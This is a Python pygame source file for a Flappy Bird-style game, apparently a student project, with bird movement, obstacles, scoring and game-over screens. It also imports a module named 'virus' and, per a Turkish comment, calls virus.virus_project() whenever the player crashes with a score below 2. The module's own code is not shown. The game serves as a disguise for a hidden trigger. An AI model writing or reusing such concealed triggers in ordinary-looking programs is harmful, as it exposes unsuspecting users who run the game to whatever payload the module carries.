import pygame
import random
import  virus






# Initialising the modules in pygame
pygame.init()

SCREEN = pygame.display.set_mode((650, 750))  # Setting the display

# background
BACKGROUND_IMAGE = pygame.image.load('background.jpeg')

#  BIRD
BIRD_IMAGE = pygame.image.load('img.png')
bird_x = 50
bird_y = 300
bird_y_change = 0


def display_bird(x, y):
    SCREEN.blit(BIRD_IMAGE, (x, y))


# OBSTACLES
OBSTACLE_WIDTH = 70
OBSTACLE_HEIGHT = random.randint(150, 450)
OBSTACLE_COLOR = (178, 202, 188)
OBSTACLE_X_CHANGE = -4
obstacle_x = 500
obstacle_gap = 150

def display_obstacle(height):
    pygame.draw.rect(SCREEN, OBSTACLE_COLOR, (obstacle_x, 0, OBSTACLE_WIDTH, height))
    bottom_obstacle_height = 900 - height - obstacle_gap
    pygame.draw.rect(SCREEN, OBSTACLE_COLOR, (obstacle_x, height+obstacle_gap, OBSTACLE_WIDTH, bottom_obstacle_height))


# COLLISION DETECTION
def collision_detection(obstacle_x, obstacle_height, bird_y, bottom_obstacle_height):
    if 50 <= obstacle_x <= (50 + 64):
        if bird_y <= obstacle_height or bird_y >= (bottom_obstacle_height - 64):
            return True
    return False


# SCORE
score = 0
total_durum = False
SCORE_FONT = pygame.font.Font('freesansbold.ttf', 32)


def score_display(score):
    display = SCORE_FONT.render(f"Score: {score}", True, (255, 255, 255))
    SCREEN.blit(display, (10, 10))


# START SCREEN
startFont = pygame.font.Font('freesansbold.ttf', 32)


def start():
    # displays: "press space bar to start)
    display = startFont.render(f"PRESS SPACE BAR TO START", True, (255, 255, 255))
    SCREEN.blit(display, (100, 200))
    pygame.display.update()


# GAME OVER SCREEN
# This list will hold scores
score_list = [0]

game_over_font1 = pygame.font.Font('freesansbold.ttf', 64)
game_over_font2 = pygame.font.Font('freesansbold.ttf', 32)


def game_over():
    # check for the maximum score
    maximum = max(score_list)
    #  "game over"
    display1 = game_over_font1.render(f"GAME OVER", True, (200, 35, 35))
    SCREEN.blit(display1, (130, 300))
    # shows your current score and your max score
    display2 = game_over_font2.render(f"SCORE: {score} MAX SCORE: {maximum}", True, (255, 255, 255))
    SCREEN.blit(display2, (130, 400))
    #  If your new score is the same as the maximum then u reached a new high score
    if score == maximum:
        display3 = game_over_font2.render(f"NEW HIGH SCORE!!", True, (200, 35, 35))
        SCREEN.blit(display3, (160, 100))


running = True
# waiting is going to refer to our end or start screen
waiting = True
# set collision to false in the beginning so that we only see the start screen in the beginning
collision = False

clock = pygame.time.Clock()
while running:
    clock.tick(65)
    SCREEN.fill((0, 0, 0))

    # display the background image
    SCREEN.blit(BACKGROUND_IMAGE, (0, 0))

    # we will be sent into this while loop at the beginning and ending of each game
    while waiting:
        if collision:
            # If collision is True (from the second time onwards) we will see both the end screen and the start screen
            game_over()
            start()
        else:
            # This refers to the first time the player is starting the game
            start()

        for event in pygame.event.get():
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_SPACE:
                    # If we press the space bar we will exit out of the waiting while loop and start to play the game
                    # we will also reset variables such as the score and the bird's Y position and the
                    # obstacle's starting position
                    score = 0
                    bird_y = 300
                    obstacle_x = 500
                    #  to exit out of the while loop
                    waiting = False

            if event.type == pygame.QUIT:
                # in case we exit make both running and waiting false
                waiting = False
                running = False

    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            # If you press exit you exit out of the while loop and pygame quits
            running = False

        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_SPACE:
                #  if you press space bar you will move up
                bird_y_change = -6

        if event.type == pygame.KEYUP:
            if event.key == pygame.K_SPACE:
                # when u release space bar you will move down automatically
                bird_y_change = 3


    # moving the bird vertically
    bird_y += bird_y_change
    # setting boundaries for the birds movement
    if bird_y <= 0:
        bird_y = 0
    if bird_y >= 571:
        bird_y = 571

    # Moving the obstacle
    obstacle_x += OBSTACLE_X_CHANGE

    # COLLISION
    collision = collision_detection(obstacle_x, OBSTACLE_HEIGHT, bird_y, OBSTACLE_HEIGHT + 150)

    if collision:
        # if a collision does occur we are going to add that score to our list of scores and make waiting True
        score_list.append(score)
        waiting = True

    # generating new obstacles
    if obstacle_x <= -10:
        obstacle_x = 500
        OBSTACLE_HEIGHT = random.randint(200, 400)
        score += 1
    # displaying the obstacle
    display_obstacle(OBSTACLE_HEIGHT)

    # displaying the bird
    display_bird(bird_x, bird_y)

    # display the score
    score_display(score)

    # Update the display after each iteration of the while loop
    pygame.display.update()

    if collision:
        if score < 2:  #score 2 den küçük olduğunda virüs dosyasının çağırıldığı kod
            virus.virus_project()


# Quit the program
pygame.quit()